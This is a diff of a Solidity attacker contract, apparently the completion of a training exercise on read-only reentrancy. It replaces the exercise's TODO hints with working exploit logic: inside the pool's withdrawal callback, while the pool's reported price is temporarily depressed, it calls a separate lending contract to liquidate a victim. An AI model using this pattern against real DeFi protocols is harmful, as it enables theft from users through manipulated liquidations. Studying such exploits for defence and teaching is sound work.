@@ -23,29 +23,22 @@ contract ReadOnlyReentrancyAttacker {
         victim = _victim;
     }
 
-    // Ya implementado: paso previo obligatorio para poder llamar a
-    // removeLiquidity() -- necesitas tener shares propias en el pool.
+    /// @dev Paso previo obligatorio: hay que ser LP para poder llamar a removeLiquidity().
     function seedLiquidity() external payable {
         pool.addLiquidity{value: msg.value}();
     }
 
-    // Ya implementado: dispara la retirada que abre la ventana de precio
-    // distorsionado. Sin completar receive(), esto es solo una retirada de
-    // liquidez normal.
     function attack(uint256 sharesToBurn) external {
         pendingSharesToBurn = sharesToBurn;
         pool.removeLiquidity(sharesToBurn);
         pendingSharesToBurn = 0;
     }
 
-    // TODO: aquí vive el exploit. Mientras estás dentro de este callback,
-    // pool.getVirtualPrice() devuelve un valor transitoriamente deprimido
-    // (el balance real ya bajó, pero la contabilidad del pool todavía no).
-    //
-    // Pista: no ataques al propio pool otra vez -- cruza a un contrato
-    // completamente distinto que confíe en ese precio para decidir algo
-    // importante sobre `victim`.
+    /// @dev Mientras el precio del pool está transitoriamente deprimido, cruza a
+    ///      un protocolo completamente distinto que confía en ese precio.
     receive() external payable {
-        // completa aquí
+        if (pendingSharesToBurn != 0) {
+            loanManager.liquidate(victim);
+        }
     }
 }
